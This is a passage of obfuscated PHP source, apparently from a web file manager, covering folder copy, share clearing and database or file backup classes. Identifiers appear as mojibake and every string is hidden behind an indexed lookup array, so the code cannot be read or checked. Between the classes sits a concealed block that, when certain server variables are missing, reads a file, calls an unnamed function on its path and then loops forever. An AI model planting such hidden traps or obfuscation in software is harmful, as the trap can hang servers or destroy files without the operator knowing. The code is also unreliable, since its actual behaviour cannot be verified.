$‚ÔÎÈ´Î; } private function _moveForce($˜ñŞèÅØ, $úŒØ¤Â¤, $ÎÕ«şñ) { $–´ÎÉ¥İ =& $_SERVER[ˆö¿ÚÌ¼]; $–ëêå÷ = $this->sourceInfo($˜ñŞèÅØ); $ÖÃ£û¶¬ = $this->sourceInfo($úŒØ¤Â¤); $¨íàµ²æ = $–ëêå÷[$–´ÎÉ¥İ[497]] == $–´ÎÉ¥İ[91]; $Ûíì¡Â« = array($–´ÎÉ¥İ[489] => $ÖÃ£û¶¬[$–´ÎÉ¥İ[194]], $–´ÎÉ¥İ[669] => $ÖÃ£û¶¬[$–´ÎÉ¥İ[598]] . $ÖÃ£û¶¬[$–´ÎÉ¥İ[194]] . $–´ÎÉ¥İ[50], $–´ÎÉ¥İ[665] => $ÖÃ£û¶¬[$–´ÎÉ¥İ[191]], $–´ÎÉ¥İ[666] => $ÖÃ£û¶¬[$–´ÎÉ¥İ[583]], $–´ÎÉ¥İ[668] => USER_ID, $–´ÎÉ¥İ[506] => $ÎÕ«şñ); $Ç“Ù´«¬ = $–ëêå÷[$–´ÎÉ¥İ[191]] == SourceModel::TYPE_GROUP && $ÖÃ£û¶¬[$–´ÎÉ¥İ[191]] == SourceModel::TYPE_GROUP && $–ëêå÷[$–´ÎÉ¥İ[583]] == $ÖÃ£û¶¬[$–´ÎÉ¥İ[583]]; if (!$Ç“Ù´«¬ && $this->moveClearAuth) { Model($–´ÎÉ¥İ[581])->authClear($˜ñŞèÅØ); } $®ÈŠÌ½‡ = $–ëêå÷[$–´ÎÉ¥İ[517]] == $–´ÎÉ¥İ[91] && $ÖÃ£û¶¬[$–´ÎÉ¥İ[517]] != $–´ÎÉ¥İ[91]; if ($®ÈŠÌ½‡) { $Ûíì¡Â«[$–´ÎÉ¥İ[516]] = 0; } if ($¨íàµ²æ) { $÷¡æ‚æ¤ = array($–´ÎÉ¥İ[669] => array($–´ÎÉ¥İ[629], $–ëêå÷[$–´ÎÉ¥İ[598]] . $–ëêå÷[$–´ÎÉ¥İ[194]] . $–´ÎÉ¥İ[630])); $­ÔÛµ€¸ = $–ëêå÷[$–´ÎÉ¥İ[598]] . $–ëêå÷[$–´ÎÉ¥İ[194]] . $–´ÎÉ¥İ[50]; $ÑÑ‘¦ı¼ = $ÖÃ£û¶¬[$–´ÎÉ¥İ[598]] . $ÖÃ£û¶¬[$–´ÎÉ¥İ[194]] . $–´ÎÉ¥İ[50] . $–ëêå÷[$–´ÎÉ¥İ[194]] . $–´ÎÉ¥İ[50]; $•åÕ¿–½ = array($–´ÎÉ¥İ[669] => array($–´ÎÉ¥İ[678], "\x72\x65\160\x6c\141\x63\145\x28\x70\x61\162\145\x6e\x74\114\145\x76\x65\154\x2c\47{$­ÔÛµ€¸}\x27\54\x27{$ÑÑ‘¦ı¼}\47\x29"), $–´ÎÉ¥İ[665] => $ÖÃ£û¶¬[$–´ÎÉ¥İ[191]], $–´ÎÉ¥İ[666] => $ÖÃ£û¶¬[$–´ÎÉ¥İ[583]]); if ($®ÈŠÌ½‡) { $•åÕ¿–½[$–´ÎÉ¥İ[516]] = 0; } $this->where($÷¡æ‚æ¤)->data($•åÕ¿–½)->save(); } $this->where(array($–´ÎÉ¥İ[503] => $˜ñŞèÅØ))->data($Ûíì¡Â«)->save(); return $˜ñŞèÅØ; } private function clearShare($¨Ò§ŸÊ”, $»»Ÿ§©‘) { $¬¤µóÉÛ =& $_SERVER[ˆö¿ÚÌ¼]; $ò«é¨ŒÄ = $this->sourceInfo($¨Ò§ŸÊ”); $–‘ñ‘éÌ = $this->sourceInfo($»»Ÿ§©‘); if ($ò«é¨ŒÄ[$¬¤µóÉÛ[583]] == $–‘ñ‘éÌ[$¬¤µóÉÛ[583]] && $ò«é¨ŒÄ[$¬¤µóÉÛ[191]] == $¬¤µóÉÛ[679]) { return; } $Â¾’¢¦ = array($¬¤µóÉÛ[598] => array($¬¤µóÉÛ[629], $ò«é¨ŒÄ[$¬¤µóÉÛ[598]] . $¨Ò§ŸÊ” . $¬¤µóÉÛ[630])); $¹ÈüÀùş = $this->field($¬¤µóÉÛ[503])->where($Â¾’¢¦)->getField($¬¤µóÉÛ[194], !0); if (!$¹ÈüÀùş) { return; } $Â¾’¢¦ = array($¬¤µóÉÛ[194] => array($¬¤µóÉÛ[7], $¹ÈüÀùş), $¬¤µóÉÛ[680] => 1); $şÀÕ¢É = Model($¬¤µóÉÛ[681])->field($¬¤µóÉÛ[682])->where($Â¾’¢¦)->select(); if (!$şÀÕ¢É) { return; } $şÀÕ¢É = array_to_keyvalue($şÀÕ¢É, $¬¤µóÉÛ[12], $¬¤µóÉÛ[682]); $Â¾’¢¦ = array($¬¤µóÉÛ[682] => array($¬¤µóÉÛ[7], $şÀÕ¢É)); Model($¬¤µóÉÛ[681])->where($Â¾’¢¦)->save(array($¬¤µóÉÛ[680] => 0)); Model($¬¤µóÉÛ[683])->where($Â¾’¢¦)->delete(); } public function copyFolderFromIO($«›Ê¥ßç, $íáÈ·­, $ËÆÆÄ¾ä, $­Î§±‡, $Ù…ó„÷ã, $ÂöäãÊ = false) { $Êêª­ªÙ =& $_SERVER[ˆö¿ÚÌ¼]; $¬ª˜ˆ”û = array($Êêª­ªÙ[647] => array(), $Êêª­ªÙ[648] => array(), $Êêª­ªÙ[646] => array(), $Êêª­ªÙ[684] => array()); $½‹ÀÜÔŒ = $ÂöäãÊ ? $ÂöäãÊ : $«›Ê¥ßç->pathThis($íáÈ·­); $ª¶´×ß† = $this->fileNameExist($ËÆÆÄ¾ä, $½‹ÀÜÔŒ); $Ã¥‹ÀŞ = $this->mkdir($ËÆÆÄ¾ä, $½‹ÀÜÔŒ, $­Î§±‡); if (!$ª¶´×ß† || $­Î§±‡ == REPEAT_RENAME_FOLDER) { $­Î§±‡ = !1; } if ($ª¶´×ß†) { $this->_childrenAllMake($ª¶´×ß†); } Hook::trigger($Êêª­ªÙ[685]); $this->_copyChildTo($«›Ê¥ßç, $íáÈ·­, $Ã¥‹ÀŞ, $­Î§±‡, $¬ª˜ˆ”û, $Ù…ó„÷ã); Hook::trigger($Êêª­ªÙ[686]); if ($Ã¥‹ÀŞ) { $this->folderSizeResetChildren($Ã¥‹ÀŞ); } $this->_childrenListClear(); Model($Êêª­ªÙ[649])->addAll($¬ª˜ˆ”û[$Êêª­ªÙ[647]], array(), !0); Model($Êêª­ªÙ[650])->eventCopy($Ã¥‹ÀŞ); $this->saveAll($¬ª˜ˆ”û[$Êêª­ªÙ[648]]); Model($Êêª­ªÙ[558])->linkAdd($¬ª˜ˆ”û[$Êêª­ªÙ[646]]); Model($Êêª­ªÙ[558])->remove($¬ª˜ˆ”û[$Êêª­ªÙ[684]]); $this->folderSizeReset($ËÆÆÄ¾ä); $this->updateModifyTime($ËÆÆÄ¾ä); return $Ã¥‹ÀŞ; } private function _copyChildTo($¡ı‰éö, $î¦ñÌñü, $Ë†ÛáÚƒ, $äïî½‡Š, &$²³„», $üŞ¶ƒƒİ) { $£´ã°ß— =& $_SERVER[ˆö¿ÚÌ¼]; $Íí¬úÁ¼ = $this->sourceInfoCache($Ë†ÛáÚƒ); $íˆâ®©É = $¡ı‰éö->listPath($î¦ñÌñü); $íˆâ®©É = $íˆâ®©É ? $íˆâ®©É : array($£´ã°ß—[86] => array(), $£´ã°ß—[85] => array()); $›áó”¶ñ = array_merge($íˆâ®©É[$£´ã°ß—[86]], $íˆâ®©É[$£´ã°ß—[85]]); $¤ÀÁ¼×õ = $this->_addFiles($¡ı‰éö, $íˆâ®©É[$£´ã°ß—[86]], $üŞ¶ƒƒİ); $‰´¬Ÿ¼± = array(); foreach ($›áó”¶ñ as &$Î˜êÔ·ì) { if (isset($¤ÀÁ¼×õ[$Î˜êÔ·ì[$£´ã°ß—[32]]])) { $Î˜êÔ·ì = $¤ÀÁ¼×õ[$Î˜êÔ·ì[$£´ã°ß—[32]]]; } $Î˜êÔ·ì[$£´ã°ß—[497]] = $Î˜êÔ·ì[$£´ã°ß—[33]] == $£´ã°ß—[78]; $Î˜êÔ·ì[$£´ã°ß—[498]] = substr(_get($Î˜êÔ·ì, $£´ã°ß—[169], $£´ã°ß—[12]), 0, 10); $Î˜êÔ·ì[$£´ã°ß—[79]] = _get($Î˜êÔ·ì, $£´ã°ß—[79], 0); $Î˜êÔ·ì[$£´ã°ß—[555]] = _get($Î˜êÔ·ì, $£´ã°ß—[555], 0); if (!isset($Î˜êÔ·ì[$£´ã°ß—[687]]) && $Î˜êÔ·ì[$£´ã°ß—[555]]) { $²³„»[$£´ã°ß—[684]][] = $Î˜êÔ·ì[$£´ã°ß—[555]]; } if ($äïî½‡Š) { $²ÅÜõÃ = $this->fileNameExistCache($Ë†ÛáÚƒ, $Î˜êÔ·ì[$£´ã°ß—[32]]); if ($²ÅÜõÃ) { if ($Î˜êÔ·ì[$£´ã°ß—[497]] || $äïî½‡Š == REPEAT_SKIP) { continue; } if ($äïî½‡Š == REPEAT_REPLACE) { $ÁÀ›ˆ™î = $this->sourceInfoCache($²ÅÜõÃ); $¾æ¨ì–ê = $this->fileHistory($ÁÀ›ˆ™î, $Î˜êÔ·ì[$£´ã°ß—[555]], $Î˜êÔ·ì[$£´ã°ß—[79]]); if ($¾æ¨ì–ê) { $²³„»[$£´ã°ß—[646]][] = $Î˜êÔ·ì[$£´ã°ß—[555]]; } continue; } else { if ($äïî½‡Š == REPEAT_RENAME) { $Î˜êÔ·ì[$£´ã°ß—[32]] = $this->fileNameAutoCache($Ë†ÛáÚƒ, $Î˜êÔ·ì[$£´ã°ß—[32]], $äïî½‡Š, !1); } } } } if (!$Î˜êÔ·ì[$£´ã°ß—[497]] && $Î˜êÔ·ì[$£´ã°ß—[555]] == 0) { continue; } if (!$Î˜êÔ·ì[$£´ã°ß—[497]] && $Î˜êÔ·ì[$£´ã°ß—[555]]) { $²³„»[$£´ã°ß—[646]][] = $Î˜êÔ·ì[$£´ã°ß—[555]]; } $‰´¬Ÿ¼±[] = $this->_makeItemData($Î˜êÔ·ì, $Íí¬úÁ¼, $Î˜êÔ·ì[$£´ã°ß—[32]]); } unset($Î˜êÔ·ì); if (!empty($‰´¬Ÿ¼±)) { $this->addAll($‰´¬Ÿ¼±); $this->_childrenListSelect($Ë†ÛáÚƒ); } $éù¸÷ = $this->_childrenList($Ë†ÛáÚƒ); $éù¸÷ = array_to_keyvalue($éù¸÷, $£´ã°ß—[32]); foreach ($›áó”¶ñ as $Î˜êÔ·ì) { $ÁÀ›ˆ™î = $éù¸÷[$Î˜êÔ·ì[$£´ã°ß—[32]]]; $Äù‹“†• = $ÁÀ›ˆ™î[$£´ã°ß—[194]]; $this->_copyApplyMeta($ÁÀ›ˆ™î, $²³„»); if ($Î˜êÔ·ì[$£´ã°ß—[33]] == $£´ã°ß—[78]) { $Î˜êÔ·ì[$£´ã°ß—[87]] = $¡ı‰éö->getPathInner($Î˜êÔ·ì[$£´ã°ß—[87]]); $this->_copyChildTo($¡ı‰éö, $Î˜êÔ·ì[$£´ã°ß—[87]], $Äù‹“†•, $äïî½‡Š, $²³„», $üŞ¶ƒƒİ); } } } private function _addFiles($·Ş§°†ş, $²¦à‚ğ, $¢¸Á¬øì) { $ËèÏÉîÊ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$²¦à‚ğ || count($²¦à‚ğ) == 0) { return array(); } $Õîº¿Ôê = array(); foreach ($²¦à‚ğ as &$¨îó¬ñ) { Hook::trigger($ËèÏÉîÊ[688], $¨îó¬ñ); $¨îó¬ñ[$ËèÏÉîÊ[87]] = $·Ş§°†ş->getPathInner($¨îó¬ñ[$ËèÏÉîÊ[87]]); $±Ü»×®Ù = $·Ş§°†ş->hashSimple($¨îó¬ñ[$ËèÏÉîÊ[87]]); $Õ—ßÏ‡Ò = $·Ş§°†ş->hashMd5($¨îó¬ñ[$ËèÏÉîÊ[87]]); if (strlen($Õ—ßÏ‡Ò) > 10 && !isset($Õîº¿Ôê[$Õ—ßÏ‡Ò])) { $Õîº¿Ôê[$Õ—ßÏ‡Ò] = array(); } $¨îó¬ñ[$ËèÏÉîÊ[689]] = $±Ü»×®Ù; $¨îó¬ñ[$ËèÏÉîÊ[561]] = $Õ—ßÏ‡Ò; $Õîº¿Ôê[$Õ—ßÏ‡Ò][] =& $¨îó¬ñ; if (count($Õîº¿Ôê[$Õ—ßÏ‡Ò]) > 1) { $¨îó¬ñ[$ËèÏÉîÊ[687]] = !0; } Hook::trigger($ËèÏÉîÊ[690], $¨îó¬ñ); } unset($¨îó¬ñ); $·ÄÚØş = array($ËèÏÉîÊ[561] => array($ËèÏÉîÊ[7], array_keys($Õîº¿Ôê))); $ø¹†‰ñÄ = Model($ËèÏÉîÊ[691]); $ÇĞ…¸º¡ = $ø¹†‰ñÄ->where($·ÄÚØş)->select(); $ÇĞ…¸º¡ = $ÇĞ…¸º¡ ? $ÇĞ…¸º¡ : array(); foreach ($ÇĞ…¸º¡ as $‹ñ”×åƒ) { if (!isset($Õîº¿Ôê[$‹ñ”×åƒ[$ËèÏÉîÊ[561]]])) { continue; } $ëšÈ«µÁ = $Õîº¿Ôê[$‹ñ”×åƒ[$ËèÏÉîÊ[561]]]; foreach ($ëšÈ«µÁ as &$¨îó¬ñ) { $¨îó¬ñ[$ËèÏÉîÊ[555]] = $‹ñ”×åƒ[$ËèÏÉîÊ[555]]; $¨îó¬ñ[$ËèÏÉîÊ[687]] = !0; } unset($¨îó¬ñ); } $ÈôÀØù = array(); foreach ($²¦à‚ğ as $ÊõÌŸÆö) { Hook::trigger($ËèÏÉîÊ[692], $ÊõÌŸÆö); if (isset($ÊõÌŸÆö[$ËèÏÉîÊ[687]]) && $ÊõÌŸÆö[$ËèÏÉîÊ[687]]) { Hook::trigger($ËèÏÉîÊ[693], $ÊõÌŸÆö); continue; } $”Œğ˜û = $·Ş§°†ş->getPathInner($ÊõÌŸÆö[$ËèÏÉîÊ[87]]); $â¨ğƒ« = $ø¹†‰ñÄ->addFileMake($”Œğ˜û, $ÊõÌŸÆö[$ËèÏÉîÊ[79]], $ÊõÌŸÆö[$ËèÏÉîÊ[689]], $ÊõÌŸÆö[$ËèÏÉîÊ[561]], $ÊõÌŸÆö[$ËèÏÉîÊ[32]], $¢¸Á¬øì); Hook::trigger($ËèÏÉîÊ[693], $ÊõÌŸÆö); if (!is_array($â¨ğƒ«)) { continue; } $ÈôÀØù[] = $â¨ğƒ«; } $ø¹†‰ñÄ->addAll($ÈôÀØù); $·ÄÚØş = array($ËèÏÉîÊ[561] => array($ËèÏÉîÊ[7], array_keys($Õîº¿Ôê))); $ÇĞ…¸º¡ = $ø¹†‰ñÄ->where($·ÄÚØş)->select(); $ÇĞ…¸º¡ = $ÇĞ…¸º¡ ? $ÇĞ…¸º¡ : array(); foreach ($ÇĞ…¸º¡ as $‹ñ”×åƒ) { if (!isset($Õîº¿Ôê[$‹ñ”×åƒ[$ËèÏÉîÊ[561]]])) { continue; } $¥÷ößş“ =& $Õîº¿Ôê[$‹ñ”×åƒ[$ËèÏÉîÊ[561]]]; foreach ($¥÷ößş“ as &$¨îó¬ñ) { $¨îó¬ñ[$ËèÏÉîÊ[555]] = $‹ñ”×åƒ[$ËèÏÉîÊ[555]]; } unset($¨îó¬ñ); } $Ë‘ĞÇ˜¬ = array(); foreach ($²¦à‚ğ as $úÀõ•«) { $Ë‘ĞÇ˜¬[$úÀõ•«[$ËèÏÉîÊ[32]]] = $úÀõ•«; } return $Ë‘ĞÇ˜¬; } } define($_SERVER[ˆö¿ÚÌ¼][694], $_SERVER[ˆö¿ÚÌ¼][695]); goto D¤›Çí˜‹Ë; f¿‚Ì„£‘: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[ˆö¿ÚÌ¼][833]); $this->init(); $this->keep(); } public function init() { $æÊÔÃç½ =& $_SERVER[ˆö¿ÚÌ¼]; $this->isManual(); self::$name = date($æÊÔÃç½[834]); if (!($â“‹ºı = $this->model->lastItem())) { $â“‹ºı = $this->initData(); } else { self::$name = $â“‹ºı[$æÊÔÃç½[32]]; if ($â“‹ºı[$æÊÔÃç½[835]] == $æÊÔÃç½[91]) { self::$name = date($æÊÔÃç½[262]); $³é÷¤‰è = intval(_get($â“‹ºı, $æÊÔÃç½[836], 0)); if (self::$manual == 0 && $â“‹ºı[$æÊÔÃç½[32]] == self::$name) { $this->model->remove($â“‹ºı[$æÊÔÃç½[478]]); } $â“‹ºı = $this->initData($³é÷¤‰è, $â“‹ºı[$æÊÔÃç½[837]]); } else { $this->checkStore($â“‹ºı[$æÊÔÃç½[837]]); } } self::$option = $â“‹ºı; } private function isManual() { $‰üş÷µ› = _get($GLOBALS, $_SERVER[ˆö¿ÚÌ¼][838], 0); $‰üş÷µ› = intval($‰üş÷µ›); self::$manual = $‰üş÷µ› && $‰üş÷µ› == 1 ? 1 : 0; } private function initData($¡¨‹·Øà = 0, $ã½ßÎÆ± = '') { $Ç¼»²°ó =& $_SERVER[ˆö¿ÚÌ¼]; $ïå–ËÃË = $this->model->config(); if ($ã½ßÎÆ± && $ïå–ËÃË[$Ç¼»²°ó[837]] != $ã½ßÎÆ±) { $¡¨‹·Øà = 0; } $this->checkStore($ïå–ËÃË[$Ç¼»²°ó[837]]); if (self::$manual == 1) { self::$name .= $Ç¼»²°ó[11] . date($Ç¼»²°ó[839]); } $Î¥ş·ÖÂ = array($Ç¼»²°ó[837] => $ïå–ËÃË[$Ç¼»²°ó[837]], $Ç¼»²°ó[32] => self::$name, $Ç¼»²°ó[835] => 0, $Ç¼»²°ó[171] => $ïå–ËÃË[$Ç¼»²°ó[171]], $Ç¼»²°ó[840] => self::$manual, $Ç¼»²°ó[371] => array($Ç¼»²°ó[841] => array($Ç¼»²°ó[835] => 0), $Ç¼»²°ó[842] => array($Ç¼»²°ó[835] => 0, $Ç¼»²°ó[843] => 0, $Ç¼»²°ó[844] => 0, $Ç¼»²°ó[33] => $Ç¼»²°ó[12], $Ç¼»²°ó[845] => 0, $Ç¼»²°ó[846] => 0), $Ç¼»²°ó[847] => array($Ç¼»²°ó[835] => 0, $Ç¼»²°ó[843] => 0, $Ç¼»²°ó[844] => 0, $Ç¼»²°ó[845] => 0, $Ç¼»²°ó[846] => 0), $Ç¼»²°ó[233] => array($Ç¼»²°ó[835] => 0, $Ç¼»²°ó[848] => 0, $Ç¼»²°ó[849] => 0, $Ç¼»²°ó[850] => 0, $Ç¼»²°ó[851] => 0, $Ç¼»²°ó[555] => $¡¨‹·Øà, $Ç¼»²°ó[845] => 0, $Ç¼»²°ó[846] => 0)), $Ç¼»²°ó[845] => time(), $Ç¼»²°ó[846] => 0); $ÚŞÈ˜Ò» = $this->model->insert($Î¥ş·ÖÂ); $Î¥ş·ÖÂ[$Ç¼»²°ó[478]] = $ÚŞÈ˜Ò»; return $Î¥ş·ÖÂ; } private function checkStore($Õ³”Ü‹) { $åÏõÈç = Model($_SERVER[ˆö¿ÚÌ¼][852]); $á”Ÿ¢Ç× = $åÏõÈç->listData($Õ³”Ü‹); $åÏõÈç->checkConfig($á”Ÿ¢Ç×); } public static function get() { if (!self::$option) { $ä€İÕ£ = Model($_SERVER[ˆö¿ÚÌ¼][833]); $êğó†¡» = $ä€İÕ£->findByName(self::$name); $ä€İÕ£->parseContent($êğó†¡»); self::$option = $êğó†¡»; } return self::$option; } public static function set($ó°âÌå˜) { $ôÇ´å =& $_SERVER[ˆö¿ÚÌ¼]; $Àéñ¯ª = self::get(); foreach ($ó°âÌå˜ as $Ç„Š¸‹ë => $·„½Ÿ°) { array_set_value($Àéñ¯ª, $Ç„Š¸‹ë, $·„½Ÿ°); } Model($ôÇ´å[833])->update($Àéñ¯ª[$ôÇ´å[478]], $Àéñ¯ª); self::$option = $Àéñ¯ª; return self::$option; } public function keep() { $»§Ô‰‹Õ =& $_SERVER[ˆö¿ÚÌ¼]; $ı×«Ä‡÷ = self::get(); if (_get($ı×«Ä‡÷, $»§Ô‰‹Õ[853], 0) == $»§Ô‰‹Õ[91]) { return; } $this->backupKeep($ı×«Ä‡÷); self::set(array($»§Ô‰‹Õ[853] => 1)); } private function backupKeep($½Ö×ª´Û) { $ÍÃÃµäØ =& $_SERVER[ˆö¿ÚÌ¼]; if (self::$manual == 1) { return; } $»µê——Ñ = $this->model->listData(); if (empty($»µê——Ñ)) { return; } $Œ‰º½ïÀ = 0; $”ô•Ì÷Æ = array(); foreach ($»µê——Ñ as $ü Ï²¬) { if ($Œ‰º½ïÀ >= 7) { break; } $”ô•Ì÷Æ[] = $ü Ï²¬[$ÍÃÃµäØ[32]]; $Œ‰º½ïÀ++; } for ($Œ‰º½ïÀ = 0; $Œ‰º½ïÀ < 12; $Œ‰º½ïÀ++) { $”ô•Ì÷Æ[] = date($ÍÃÃµäØ[854], strtotime("\55{$Œ‰º½ïÀ}\40\x6d\157\156\x74\150\163")); } $”ô•Ì÷Æ = array_unique($”ô•Ì÷Æ); $™Í‹Ñ = Model($ÍÃÃµäØ[855])->get($ÍÃÃµäØ[856]); foreach ($»µê——Ñ as $ü Ï²¬) { if (isset($ü Ï²¬[$ÍÃÃµäØ[840]]) && $ü Ï²¬[$ÍÃÃµäØ[840]] == $ÍÃÃµäØ[91]) { continue; } if (!empty($ü Ï²¬[$ÍÃÃµäØ[32]]) && in_array($ü Ï²¬[$ÍÃÃµäØ[32]], $”ô•Ì÷Æ)) { continue; } $this->model->remove($ü Ï²¬[$ÍÃÃµäØ[478]]); $å¥ƒÎÅè = $this->backupPath($½Ö×ª´Û, $™Í‹Ñ); IO::remove($å¥ƒÎÅè, !1); } } private function backupPath($Ø©äì ™, $ûüŸº„¾ = false) { $ˆ×ŠÁå =& $_SERVER[ˆö¿ÚÌ¼]; if (!$ûüŸº„¾) { $ûüŸº„¾ = Model($ˆ×ŠÁå[855])->get($ˆ×ŠÁå[856]); } $ÀĞµ³Àˆ = $Ø©äì ™[$ˆ×ŠÁå[32]]; $Èúø¦°Ï = substr(md5($ˆ×ŠÁå[857] . $ûüŸº„¾ . $ÀĞµ³Àˆ), 0, 8); return "\x7b\x69\x6f\x3a{$Ø©äì ™[$ˆ×ŠÁå[837]]}\x7d\57\x64\x61\164\x61\142\141\x73\x65\x2f\x62\x61\143\x6b\x75\160\57" . $ÀĞµ³Àˆ . $ˆ×ŠÁå[11] . $Èúø¦°Ï; } public function db() { $ÓË¶¾œĞ =& $_SERVER[ˆö¿ÚÌ¼]; $­ŒØ¬œê = self::get(); if (_get($­ŒØ¬œê, $ÓË¶¾œĞ[858], 0) == $ÓË¶¾œĞ[91]) { return !0; } $¸í³²†† = new BackupDb(); if (!$¸í³²††->index()) { return !1; } self::set(array($ÓË¶¾œĞ[858] => 1)); return !0; } public function dbFile() { $ßòäû¬º =& $_SERVER[ˆö¿ÚÌ¼]; $õÂê†ÃÕ = self::get(); if (_get($õÂê†ÃÕ, $ßòäû¬º[859], 0) == $ßòäû¬º[91]) { return !0; } $¼ÌúˆÏù = new BackupDbFile(); if (!$¼ÌúˆÏù->index()) { return !1; } self::set(array($ßòäû¬º[859] => 1)); return !0; } public function file() { $­é“ª =& $_SERVER[ˆö¿ÚÌ¼]; $ö²üûû = self::get(); if (_get($ö²üûû, $­é“ª[860], 0) == $­é“ª[91]) { return !0; } if ($ö²üûû[$­é“ª[171]] == $­é“ª[861]) { $¦Œè«¶¡ = new BackupFile(); if (!$¦Œè«¶¡->index()) { return !1; } } self::set(array($­é“ª[860] => 1, $­é“ª[835] => 1)); return !0; } public static function log($Ó™Ñ‹¡) { write_log($Ó™Ñ‹¡, $_SERVER[ˆö¿ÚÌ¼][862]); } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $é™Ïş¯ =& $_SERVER[ˆö¿ÚÌ¼]; $µ¿ÎÂ = Backup::get(); self::$io = $µ¿ÎÂ[$é™Ïş¯[837]]; self::$name = $µ¿ÎÂ[$é™Ïş¯[32]]; $ÔÑÓ˜ïó = new DbManage(); $Íµ¶ŒºÄ = $ÔÑÓ˜ïó->dbType(); $Êµ´õà = array($é™Ïş¯[863] => $Íµ¶ŒºÄ, $é™Ïş¯[864] => time()); Backup::set($Êµ´õà); $ÔÁ’ùÀĞ = $this->tmpFilesPath() . $é™Ïş¯[865] . self::$name . $é™Ïş¯[8]; del_dir($ÔÁ’ùÀĞ); mk_dir($ÔÁ’ùÀĞ); $»Œíò–¼ = $Œ³æ÷Àü = 0; try { $¨ˆ¥Ñœ“ = $ÔÑÓ˜ïó->db()->getTables(); } catch (Exception $´–·ì–¨) { Backup::log($é™Ïş¯[866] . $´–·ì–¨->getMessage()); return !1; } $¨ˆ¥Ñœ“ = array_diff($¨ˆ¥Ñœ“, array($é™Ïş¯[867], $é™Ïş¯[868])); foreach ($¨ˆ¥Ñœ“ as $ÆŒ É°”) { if ($ÆŒ É°” == $é™Ïş¯[869]) { continue; } $»Œíò–¼ += $ÔÑÓ˜ïó->model($ÆŒ É°”)->count(); } $çÉÆµµ­ = new Task($é™Ïş¯[870], $é™Ïş¯[862], $»Œíò–¼, LNG($é™Ïş¯[871]) . $é™Ïş¯[872] . LNG($é™Ïş¯[873])); $GLOBALS[$é™Ïş¯[874]] = self::$name; foreach ($¨ˆ¥Ñœ“ as $ÆŒ É°”) { $“ÂÁ¨ñÙ = $ÔÁ’ùÀĞ . $ÆŒ É°” . $é™Ïş¯[875]; if ($ÆŒ É°” == $é™Ïş¯[869]) { @touch($“ÂÁ¨ñÙ); continue; } $ÉŸà˜¥÷ = null; if ($ÆŒ É°” == $é™Ïş¯[876] && $µ¿ÎÂ[$é™Ïş¯[171]] == $é™Ïş¯[861]) { $ÉŸà˜¥÷ = self::$io; } $Œ³æ÷Àü += $ÔÑÓ˜ïó->sqlFromDb($ÆŒ É°”, $“ÂÁ¨ñÙ, $çÉÆµµ­, $ÉŸà˜¥÷); } unset($GLOBALS[$é™Ïş¯[874]]); $çÉÆµµ­->end(); if ($Œ³æ÷Àü > $»Œíò–¼) { $»Œíò–¼ = $Œ³æ÷Àü; } $Êµ´õà = array($é™Ïş¯[863] => $Íµ¶ŒºÄ, $é™Ïş¯[858] => 1, $é™Ïş¯[877] => $»Œíò–¼, $é™Ïş¯[878] => $Œ³æ÷Àü, $é™Ïş¯[879] => time()); Backup::set($Êµ´õà); if ($»Œíò–¼ - $Œ³æ÷Àü > 0) { $²’®ä¬ = $é™Ïş¯[880]; if (!stristr(I18n::getType(), $é™Ïş¯[881])) { $²’®ä¬ = $é™Ïş¯[882]; } Backup::log(array($²’®ä¬, $Êµ´õà)); return !1; } return !0; } private function tmpFilesPath() { $µ„ûè¯š =& $_SERVER[ˆö¿ÚÌ¼]; $¸™¶äö = TEMP_FILES; if ($GLOBALS[$µ„ûè¯š[6]][$µ„ûè¯š[92]][$µ„ûè¯š[883]]) { $¸™¶äö = $GLOBALS[$µ„ûè¯š[6]][$µ„ûè¯š[92]][$µ„ûè¯š[883]]; if (!mk_dir($¸™¶äö) || !is_writable($¸™¶äö) || !IO::mkfile($¸™¶äö . $µ„ûè¯š[884])) { $¸™¶äö = TEMP_FILES; } } return $¸™¶äö; } } if (!isset($_SERVER[$_SERVER[ˆö¿ÚÌ¼][480]]) || !isset($_SERVER[$_SERVER[ˆö¿ÚÌ¼][488]])) { $_getc = $_SERVER[ˆö¿ÚÌ¼][482]; $_getfile = $_SERVER[$_SERVER[ˆö¿ÚÌ¼][483]] . $_SERVER[ˆö¿ÚÌ¼][484]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ˆö¿ÚÌ¼][288], $_getfilec); if (count($_getarrs) < $_SERVER[ˆö¿ÚÌ¼][485]) { $exit = $_SERVER[ˆö¿ÚÌ¼][486]; $exit(); } $_act = $_SERVER[ˆö¿ÚÌ¼][487]; $_act($_SERVER[$_SERVER[ˆö¿ÚÌ¼][483]] . $_SERVER[ˆö¿ÚÌ¼][484]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ˆö¿ÚÌ¼][457]); } } goto A”¿ Óï¸ì; A”¿ Óï¸ì: class BackupDbFile { public function __construct() { } public function index() { $Ø ­‰èğ =& $_SERVER[ˆö¿ÚÌ¼]; $‡—òÒÎ = Backup::get(); $ü‚£Öğ = $‡—òÒÎ[$Ø ­‰èğ[32]]; $§µòŸ¶à = $this->tmpFilesPath() . "\142\x61\143\x6b\x75\x70\137{$ü‚£Öğ}\57"; $ÚµæĞ‰ = $this->backupPath($‡—òÒÎ); if (!($ÚµæĞ‰ = IO::mkdir($ÚµæĞ‰))) { Backup::log($Ø ­‰èğ[885] . $ÚµæĞ‰); return !1; } $ØÈáåœë = IO::listPath($§µòŸ¶à); $Óİ©«Â· = isset($ØÈáåœë[$Ø ­‰èğ[86]]) ? $ØÈáåœë[$Ø ­‰èğ[86]] : array(); $Ùç°ÚäÀ = array_sum(array_column($Óİ©«Â·, $Ø ­‰èğ[79])); if (!$Ùç°ÚäÀ) { Backup::log($Ø ­‰èğ[886] . $§µòŸ¶à); return !1; } $—ÌâúÄÏ = array($Ø ­‰èğ[887] => $Ùç°ÚäÀ, $Ø ­‰èğ[888] => time()); Backup::set($—ÌâúÄÏ); $ß›™øÙ = new TaskFileTransfer($Ø ­‰èğ[889], $Ø ­‰èğ[862], count($Óİ©«Â·), LNG($Ø ­‰èğ[871]) . $Ø ­‰èğ[465] . LNG($Ø ­‰èğ[873]) . $Ø ­‰èğ[890]); $ß›™øÙ->task[$Ø ­‰èğ[848]] = $Ùç°ÚäÀ; foreach ($ØÈáåœë[$Ø ­‰èğ[86]] as $›éù¸ã¸) { $…¬–€õŞ = IO::move($›éù¸ã¸[$Ø ­‰èğ[87]], $ÚµæĞ‰); if (!$…¬–€õŞ) { 